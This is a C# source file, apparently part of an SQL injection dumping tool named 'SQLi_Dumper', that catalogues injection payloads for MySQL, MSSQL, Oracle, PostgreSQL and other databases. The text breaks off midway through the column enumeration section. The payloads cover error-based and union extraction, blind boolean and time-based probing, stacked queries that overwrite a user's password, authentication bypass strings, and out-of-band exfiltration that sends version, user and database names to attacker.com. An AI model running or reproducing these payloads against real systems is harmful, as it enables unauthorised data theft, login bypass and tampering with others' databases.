using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using DataBase;

namespace SQLi_Dumper.Core
{
    /// <summary>
    /// Comprehensive SQL injection payload collection for multiple database management systems
    /// </summary>
    public static class Payloads
    {
        /// <summary>
        /// Payload category enumeration
        /// </summary>
        public enum PayloadCategory
        {
            Error_Based,
            Union_Based,
            Boolean_Based,
            Time_Based,
            Stacked_Queries,
            Out_Of_Band,
            Authentication_Bypass,
            Information_Gathering,
            Data_Extraction,
            Privilege_Escalation,
            Command_Execution,
            File_Operations,
            Blind_Injection,
            Second_Order,
            NoSQL_Injection,
            Generic_Tests
        }

        /// <summary>
        /// Payload structure
        /// </summary>
        public class Payload
        {
            public string Name { get; set; }
            public PayloadCategory Category { get; set; }
            public string Description { get; set; }
            public string PayloadString { get; set; }
            public DbTypes.DatabaseFamily[] SupportedDatabases { get; set; }
            public string[] Variations { get; set; }
            public bool RequiresPrivileges { get; set; }
            public string ExpectedResult { get; set; }
            public int RiskLevel { get; set; } // 1-5 scale

            public Payload()
            {
                SupportedDatabases = new DbTypes.DatabaseFamily[0];
                Variations = new string[0];
                RequiresPrivileges = false;
                RiskLevel = 1;
            }
        }

        /// <summary>
        /// All supported database families
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] AllDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.MongoDB,
            DbTypes.DatabaseFamily.DB2, DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix,
            DbTypes.DatabaseFamily.MariaDB, DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// SQL-based databases (excluding NoSQL)
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] SQLDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.DB2,
            DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix, DbTypes.DatabaseFamily.MariaDB,
            DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// Master payload collection
        /// </summary>
        public static readonly List<Payload> AllPayloads = new List<Payload>();

        /// <summary>
        /// Initialize payload collections
        /// </summary>
        static Payloads()
        {
            InitializeErrorBasedPayloads();
            InitializeUnionBasedPayloads();
            InitializeBooleanBasedPayloads();
            InitializeTimeBasedPayloads();
            InitializeStackedQueryPayloads();
            InitializeOutOfBandPayloads();
            InitializeAuthenticationBypassPayloads();
            InitializeInformationGatheringPayloads();
            InitializeDataExtractionPayloads();
            InitializePrivilegeEscalationPayloads();
            InitializeCommandExecutionPayloads();
            InitializeFileOperationPayloads();
            InitializeBlindInjectionPayloads();
            InitializeSecondOrderPayloads();
            InitializeNoSQLPayloads();
            InitializeGenericTestPayloads();
        }

        #region Error-Based Payloads

        private static void InitializeErrorBasedPayloads()
        {
            // MySQL Error-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL UpdateXML Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits updatexml() function to generate XML parsing error",
                    PayloadString = "' AND updatexml(null,concat(0x0a,version(),0x0a),null)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
                        "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
                        "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "MySQL ExtractValue Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits extractvalue() function to generate XML parsing error",
                    PayloadString = "' AND extractvalue(null,concat(0x0a,version(),0x0a))--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
                        "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--",
                        "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "MySQL Duplicate Entry Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits duplicate entry error with floor() and rand()",
                    PayloadString = "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14 UNION SELECT 15 UNION SELECT 16 UNION SELECT 17 UNION SELECT 18 UNION SELECT 19 UNION SELECT 20 UNION SELECT 21 UNION SELECT 22 UNION SELECT 23 UNION SELECT 24 UNION SELECT 25 UNION SELECT 26 UNION SELECT 27 UNION SELECT 28 UNION SELECT 29 UNION SELECT 30 UNION SELECT 31)x GROUP BY x)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    ExpectedResult = "Duplicate entry error",
                    RiskLevel = 3
                }
            });

            // MSSQL Error-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL CONVERT Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits CONVERT function to generate type conversion error",
                    PayloadString = "' AND CONVERT(int,@@version)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "' AND CONVERT(int,(SELECT @@version))--",
                        "' AND CONVERT(int,(SELECT user))--",
                        "' AND CONVERT(int,(SELECT db_name()))--",
                        "' AND CONVERT(int,(SELECT host_name()))--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "MSSQL CAST Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits CAST function to generate type conversion error",
                    PayloadString = "' AND CAST(@@version AS int)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "' AND CAST((SELECT @@version) AS int)--",
                        "' AND CAST((SELECT user) AS int)--",
                        "' AND CAST((SELECT db_name()) AS int)--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                }
            });

            // Oracle Error-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Oracle UTL_INADDR Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits UTL_INADDR.GET_HOST_ADDRESS for error-based injection",
                    PayloadString = "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))='1'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    Variations = new[]
                    {
                        "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))='1'--",
                        "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT name FROM v$database))='1'--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "Oracle XMLType Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits XMLType for error-based injection",
                    PayloadString = "' AND (SELECT XMLType(CHR(60)||CHR(58)||(SELECT banner FROM v$version WHERE rownum=1)||CHR(62)) FROM dual) IS NOT NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                }
            });

            // PostgreSQL Error-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "PostgreSQL CAST Error",
                    Category = PayloadCategory.Error_Based,
                    Description = "Exploits CAST function to generate type conversion error",
                    PayloadString = "' AND CAST(version() AS int)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    Variations = new[]
                    {
                        "' AND CAST((SELECT version()) AS int)--",
                        "' AND CAST((SELECT current_user) AS int)--",
                        "' AND CAST((SELECT current_database()) AS int)--"
                    },
                    ExpectedResult = "Version information in error message",
                    RiskLevel = 3
                }
            });
        }

        #endregion

        #region Union-Based Payloads

        private static void InitializeUnionBasedPayloads()
        {
            // Generic Union-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Basic Union Select",
                    Category = PayloadCategory.Union_Based,
                    Description = "Basic UNION SELECT payload for column enumeration",
                    PayloadString = "' UNION SELECT NULL--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' UNION SELECT NULL,NULL--",
                        "' UNION SELECT NULL,NULL,NULL--",
                        "' UNION SELECT NULL,NULL,NULL,NULL--",
                        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                        "' UNION ALL SELECT NULL--",
                        "' UNION ALL SELECT NULL,NULL--"
                    },
                    ExpectedResult = "No error indicates correct number of columns",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Union Version Extraction",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract database version using UNION SELECT",
                    PayloadString = "' UNION SELECT version(),NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT @@version,NULL--",
                        "' UNION SELECT version(),user()--",
                        "' UNION SELECT database(),version()--"
                    },
                    ExpectedResult = "Database version information",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Union Information Schema",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract database structure using information_schema",
                    PayloadString = "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                        "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
                        "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--"
                    },
                    ExpectedResult = "Database structure information",
                    RiskLevel = 3
                }
            });

            // MSSQL Union-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL Union Version",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract MSSQL version using UNION SELECT",
                    PayloadString = "' UNION SELECT @@version,NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "' UNION SELECT @@version,@@servername--",
                        "' UNION SELECT db_name(),user_name()--",
                        "' UNION SELECT host_name(),system_user--"
                    },
                    ExpectedResult = "MSSQL version information",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "MSSQL Union System Tables",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract MSSQL system table information",
                    PayloadString = "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "' UNION SELECT name,NULL FROM sys.tables--",
                        "' UNION SELECT name,NULL FROM sys.databases--",
                        "' UNION SELECT column_name,data_type FROM information_schema.columns--"
                    },
                    ExpectedResult = "System table information",
                    RiskLevel = 3
                }
            });

            // Oracle Union-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Oracle Union Version",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract Oracle version using UNION SELECT",
                    PayloadString = "' UNION SELECT banner,NULL FROM v$version--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    Variations = new[]
                    {
                        "' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--",
                        "' UNION SELECT user,NULL FROM dual--",
                        "' UNION SELECT name,NULL FROM v$database--"
                    },
                    ExpectedResult = "Oracle version information",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Oracle Union System Tables",
                    Category = PayloadCategory.Union_Based,
                    Description = "Extract Oracle system table information",
                    PayloadString = "' UNION SELECT table_name,NULL FROM all_tables--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    Variations = new[]
                    {
                        "' UNION SELECT table_name,NULL FROM user_tables--",
                        "' UNION SELECT column_name,data_type FROM all_tab_columns--",
                        "' UNION SELECT owner,table_name FROM all_tables--"
                    },
                    ExpectedResult = "System table information",
                    RiskLevel = 3
                }
            });
        }

        #endregion

        #region Boolean-Based Payloads

        private static void InitializeBooleanBasedPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Boolean True Condition",
                    Category = PayloadCategory.Boolean_Based,
                    Description = "Boolean-based blind injection with true condition",
                    PayloadString = "' AND 1=1--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' AND 'a'='a'--",
                        "' AND 2>1--",
                        "' AND 1<2--",
                        "' AND 1 LIKE 1--",
                        "' AND 1 BETWEEN 0 AND 2--"
                    },
                    ExpectedResult = "Same response as normal request",
                    RiskLevel = 1
                },
                new Payload
                {
                    Name = "Boolean False Condition",
                    Category = PayloadCategory.Boolean_Based,
                    Description = "Boolean-based blind injection with false condition",
                    PayloadString = "' AND 1=2--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "' AND 'a'='b'--",
                        "' AND 1>2--",
                        "' AND 2<1--",
                        "' AND 1 LIKE 2--",
                        "' AND 1 BETWEEN 3 AND 4--"
                    },
                    ExpectedResult = "Different response from normal request",
                    RiskLevel = 1
                },
                new Payload
                {
                    Name = "Boolean Database Existence",
                    Category = PayloadCategory.Boolean_Based,
                    Description = "Check if specific database exists",
                    PayloadString = "' AND (SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name='mysql') > 0--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND (SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name='test') > 0--",
                        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql') > 0--"
                    },
                    ExpectedResult = "Response indicates database existence",
                    RiskLevel = 2
                }
            });

            // MySQL Boolean-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL Version Check",
                    Category = PayloadCategory.Boolean_Based,
                    Description = "Check MySQL version using boolean logic",
                    PayloadString = "' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND (SELECT SUBSTRING(@@version,1,1)) = '8'--",
                        "' AND (SELECT SUBSTRING(@@version,1,3)) = '5.7'--",
                        "' AND (SELECT LENGTH(@@version)) > 5--"
                    },
                    ExpectedResult = "Response indicates version match",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "MySQL User Check",
                    Category = PayloadCategory.Boolean_Based,
                    Description = "Check MySQL user using boolean logic",
                    PayloadString = "' AND (SELECT user()) = 'root@localhost'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND (SELECT current_user()) LIKE 'root@%'--",
                        "' AND (SELECT user()) LIKE '%root%'--",
                        "' AND (SELECT LENGTH(user())) > 5--"
                    },
                    ExpectedResult = "Response indicates user match",
                    RiskLevel = 2
                }
            });
        }

        #endregion

        #region Time-Based Payloads

        private static void InitializeTimeBasedPayloads()
        {
            // MySQL Time-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL SLEEP",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using SLEEP function",
                    PayloadString = "' AND SLEEP(5)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND (SELECT SLEEP(5))--",
                        "' AND SLEEP(5) AND 1=1--",
                        "' OR SLEEP(5)--",
                        "' AND IF(1=1,SLEEP(5),0)--"
                    },
                    ExpectedResult = "5 second delay in response",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "MySQL BENCHMARK",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using BENCHMARK function",
                    PayloadString = "' AND BENCHMARK(50000000,MD5(1))--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' AND BENCHMARK(10000000,SHA1(1))--",
                        "' AND BENCHMARK(50000000,ENCODE('MSG','by 5 seconds'))--",
                        "' AND (SELECT BENCHMARK(50000000,MD5(1)))--"
                    },
                    ExpectedResult = "Significant delay in response",
                    RiskLevel = 2
                }
            });

            // MSSQL Time-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL WAITFOR",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using WAITFOR DELAY",
                    PayloadString = "'; WAITFOR DELAY '00:00:05'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "' AND 1=1; WAITFOR DELAY '00:00:05'--",
                        "' OR 1=1; WAITFOR DELAY '00:00:05'--",
                        "' AND (SELECT COUNT(*) FROM sysusers); WAITFOR DELAY '00:00:05'--"
                    },
                    ExpectedResult = "5 second delay in response",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "MSSQL Heavy Query",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using heavy query",
                    PayloadString = "' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    ExpectedResult = "Significant delay in response",
                    RiskLevel = 2
                }
            });

            // PostgreSQL Time-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "PostgreSQL pg_sleep",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using pg_sleep function",
                    PayloadString = "' AND pg_sleep(5)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    Variations = new[]
                    {
                        "' AND (SELECT pg_sleep(5))--",
                        "' OR pg_sleep(5)--",
                        "' AND pg_sleep(5) AND 1=1--"
                    },
                    ExpectedResult = "5 second delay in response",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "PostgreSQL Heavy Query",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using heavy query",
                    PayloadString = "' AND (SELECT COUNT(*) FROM generate_series(1,1000000))--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.PostgreSQL },
                    ExpectedResult = "Significant delay in response",
                    RiskLevel = 2
                }
            });

            // Oracle Time-Based Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Oracle DBMS_PIPE",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using DBMS_PIPE.RECEIVE_MESSAGE",
                    PayloadString = "' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) IS NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    Variations = new[]
                    {
                        "' AND DBMS_PIPE.RECEIVE_MESSAGE('ABC',5) IS NULL--",
                        "' OR DBMS_PIPE.RECEIVE_MESSAGE('ABC',5) IS NULL--"
                    },
                    ExpectedResult = "5 second delay in response",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Oracle Heavy Query",
                    Category = PayloadCategory.Time_Based,
                    Description = "Time-based blind injection using heavy query",
                    PayloadString = "' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    ExpectedResult = "Significant delay in response",
                    RiskLevel = 2
                }
            });
        }

        #endregion

        #region Stacked Query Payloads

        private static void InitializeStackedQueryPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Basic Stacked Query",
                    Category = PayloadCategory.Stacked_Queries,
                    Description = "Basic stacked query execution",
                    PayloadString = "'; SELECT 1--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.Oracle },
                    Variations = new[]
                    {
                        "'; SELECT @@version--",
                        "'; SELECT user()--",
                        "'; SELECT database()--"
                    },
                    ExpectedResult = "Additional query execution",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "Stacked Query Table Creation",
                    Category = PayloadCategory.Stacked_Queries,
                    Description = "Create table using stacked query",
                    PayloadString = "'; CREATE TABLE temp_table (id INT)--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.Oracle },
                    RequiresPrivileges = true,
                    ExpectedResult = "Table creation",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "Stacked Query Data Modification",
                    Category = PayloadCategory.Stacked_Queries,
                    Description = "Modify data using stacked query",
                    PayloadString = "'; UPDATE users SET password='hacked' WHERE id=1--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.Oracle },
                    RequiresPrivileges = true,
                    ExpectedResult = "Data modification",
                    RiskLevel = 5
                }
            });
        }

        #endregion

        #region Out-of-Band Payloads

        private static void InitializeOutOfBandPayloads()
        {
            // MSSQL Out-of-Band Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MSSQL xp_dirtree",
                    Category = PayloadCategory.Out_Of_Band,
                    Description = "Out-of-band data exfiltration using xp_dirtree",
                    PayloadString = "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    Variations = new[]
                    {
                        "'; EXEC master..xp_dirtree CONCAT('\\\\\\\\attacker.com\\\\',@@version)--",
                        "'; EXEC master..xp_dirtree CONCAT('\\\\\\\\attacker.com\\\\',db_name())--",
                        "'; EXEC master..xp_dirtree CONCAT('\\\\\\\\attacker.com\\\\',user_name())--"
                    },
                    RequiresPrivileges = true,
                    ExpectedResult = "DNS/HTTP request to attacker server",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "MSSQL xp_fileexist",
                    Category = PayloadCategory.Out_Of_Band,
                    Description = "Out-of-band data exfiltration using xp_fileexist",
                    PayloadString = "'; EXEC master..xp_fileexist '\\\\attacker.com\\share\\test.txt'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL },
                    RequiresPrivileges = true,
                    ExpectedResult = "DNS/HTTP request to attacker server",
                    RiskLevel = 4
                }
            });

            // Oracle Out-of-Band Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Oracle UTL_HTTP",
                    Category = PayloadCategory.Out_Of_Band,
                    Description = "Out-of-band data exfiltration using UTL_HTTP",
                    PayloadString = "' AND UTL_HTTP.REQUEST('http://attacker.com/oob?data='||(SELECT user FROM dual)) IS NOT NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    RequiresPrivileges = true,
                    ExpectedResult = "HTTP request to attacker server",
                    RiskLevel = 4
                },
                new Payload
                {
                    Name = "Oracle UTL_INADDR",
                    Category = PayloadCategory.Out_Of_Band,
                    Description = "Out-of-band data exfiltration using UTL_INADDR",
                    PayloadString = "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') IS NOT NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.Oracle },
                    RequiresPrivileges = true,
                    ExpectedResult = "DNS request to attacker server",
                    RiskLevel = 4
                }
            });

            // MySQL Out-of-Band Payloads
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "MySQL LOAD_FILE UNC",
                    Category = PayloadCategory.Out_Of_Band,
                    Description = "Out-of-band data exfiltration using LOAD_FILE with UNC path",
                    PayloadString = "' AND LOAD_FILE(CONCAT('\\\\\\\\attacker.com\\\\',@@version)) IS NOT NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    RequiresPrivileges = true,
                    ExpectedResult = "DNS/SMB request to attacker server",
                    RiskLevel = 4
                }
            });
        }

        #endregion

        #region Authentication Bypass Payloads

        private static void InitializeAuthenticationBypassPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "OR 1=1 Bypass",
                    Category = PayloadCategory.Authentication_Bypass,
                    Description = "Classic authentication bypass using OR 1=1",
                    PayloadString = "admin' OR '1'='1'--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "admin' OR 1=1--",
                        "admin' OR 1=1#",
                        "admin' OR 1=1/*",
                        "admin' OR 'a'='a'--",
                        "admin' OR 2>1--"
                    },
                    ExpectedResult = "Authentication bypass",
                    RiskLevel = 5
                },
                new Payload
                {
                    Name = "UNION Bypass",
                    Category = PayloadCategory.Authentication_Bypass,
                    Description = "Authentication bypass using UNION SELECT",
                    PayloadString = "admin' UNION SELECT 'admin','password'--",
                    SupportedDatabases = SQLDatabases,
                    Variations = new[]
                    {
                        "admin' UNION SELECT 1,'admin','password'--",
                        "admin' UNION SELECT NULL,'admin','password'--",
                        "' UNION SELECT 'admin','password' FROM dual--"
                    },
                    ExpectedResult = "Authentication bypass",
                    RiskLevel = 5
                },
                new Payload
                {
                    Name = "Password Hash Bypass",
                    Category = PayloadCategory.Authentication_Bypass,
                    Description = "Bypass password verification using hash functions",
                    PayloadString = "admin' AND '1'='1' AND password=MD5('admin')--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "admin' AND '1'='1' AND password=SHA1('admin')--",
                        "admin' AND '1'='1' AND password=SHA2('admin',256)--"
                    },
                    ExpectedResult = "Password bypass",
                    RiskLevel = 4
                }
            });
        }

        #endregion

        #region Information Gathering Payloads

        private static void InitializeInformationGatheringPayloads()
        {
            AllPayloads.AddRange(new[]
            {
                new Payload
                {
                    Name = "Version Information",
                    Category = PayloadCategory.Information_Gathering,
                    Description = "Gather database version information",
                    PayloadString = "' UNION SELECT @@version,NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT version(),NULL--",
                        "' UNION SELECT @@version_comment,NULL--",
                        "' UNION SELECT @@version_compile_os,NULL--"
                    },
                    ExpectedResult = "Database version information",
                    RiskLevel = 1
                },
                new Payload
                {
                    Name = "User Information",
                    Category = PayloadCategory.Information_Gathering,
                    Description = "Gather current user information",
                    PayloadString = "' UNION SELECT user(),NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT current_user(),NULL--",
                        "' UNION SELECT system_user(),NULL--",
                        "' UNION SELECT user,host FROM mysql.user--"
                    },
                    ExpectedResult = "Current user information",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Database Information",
                    Category = PayloadCategory.Information_Gathering,
                    Description = "Gather database name information",
                    PayloadString = "' UNION SELECT database(),NULL--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT schema(),NULL--",
                        "' UNION SELECT current_database(),NULL--",
                        "' UNION SELECT db_name(),NULL--"
                    },
                    ExpectedResult = "Database name information",
                    RiskLevel = 2
                },
                new Payload
                {
                    Name = "Table Enumeration",
                    Category = PayloadCategory.Information_Gathering,
                    Description = "Enumerate database tables",
                    PayloadString = "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
                        "' UNION SELECT table_name,table_schema FROM information_schema.tables--",
                        "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
                        "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--"
                    },
                    ExpectedResult = "Database table names",
                    RiskLevel = 3
                },
                new Payload
                {
                    Name = "Column Enumeration",
                    Category = PayloadCategory.Information_Gathering,
                    Description = "Enumerate table columns",
                    PayloadString = "' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--",
                    SupportedDatabases = new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.MariaDB },
                    Variations = new[]
                    {
